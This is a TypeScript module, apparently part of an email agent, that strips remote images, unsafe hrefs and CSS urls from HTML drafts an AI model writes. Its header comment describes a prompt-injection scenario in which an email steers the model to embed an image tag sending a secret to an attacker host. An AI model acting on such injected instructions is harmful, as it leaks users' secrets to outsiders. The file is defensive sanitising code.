// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
//     https://opensource.org/licenses/Apache-2.0

/**
 * Neutralise remote images and unsafe links in HTML a model wrote.
 *
 * Agent drafts (auto-drafts, `draft_reply`, `create_draft`) are stored and then
 * rendered in the reading pane and the composer. A model steered by an email
 * could put `<img src="https://attacker/?q=<secret>">` into a draft: the reader
 * blocks remote images by default, but the composer's editor and a reader with
 * remote images allowed would fetch it. Stripping at write time makes the draft
 * inert wherever it is shown, and before a person reviews and sends it.
 *
 * - `<img>` with a non-`data:`/`cid:` source becomes a bracketed text note.
 * - `href` values that are not http, https or mailto are removed.
 * - `srcset`, `background` and inline `url(...)` are removed.
 *
 * Regex-based on purpose: this runs in the Worker with no DOM, and it only ever
 * removes. The browser still sanitises with DOMPurify when it renders.
 */

const IMG_TAG = /<img\b[^>]*>/gi;
const SRC_ATTR = /\bsrc\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i;
const ALT_ATTR = /\balt\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i;
const HREF_ATTR = /(\s)href\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/gi;
const SRCSET_ATTR = /\s(?:srcset|background|ping|formaction|xlink:href)\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi;
const CSS_URL = /url\s*\(\s*(['"]?)(?!data:)[^)]*\1\s*\)/gi;

function attrValue(match: RegExpExecArray | null): string {
	return match ? (match[1] ?? match[2] ?? match[3] ?? "") : "";
}

function escapeText(text: string): string {
	return text.replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]!);
}

function isSafeLink(href: string): boolean {
	const v = href.trim().toLowerCase();
	return v.startsWith("https://") || v.startsWith("http://") || v.startsWith("mailto:") || v.startsWith("#");
}

export function neutraliseAgentHtml(html: string): string {
	if (!html) return html;
	return html
		.replace(IMG_TAG, (tag) => {
			const src = attrValue(SRC_ATTR.exec(tag)).trim().toLowerCase();
			if (src.startsWith("data:image/") || src.startsWith("cid:")) return tag.replace(SRCSET_ATTR, "");
			const alt = attrValue(ALT_ATTR.exec(tag)).trim();
			return `[image removed${alt ? `: ${escapeText(alt)}` : ""}]`;
		})
		.replace(HREF_ATTR, (whole, space: string, a?: string, b?: string, c?: string) => {
			const href = a ?? b ?? c ?? "";
			return isSafeLink(href) ? whole : space.trimEnd();
		})
		.replace(SRCSET_ATTR, "")
		.replace(CSS_URL, "none");
}
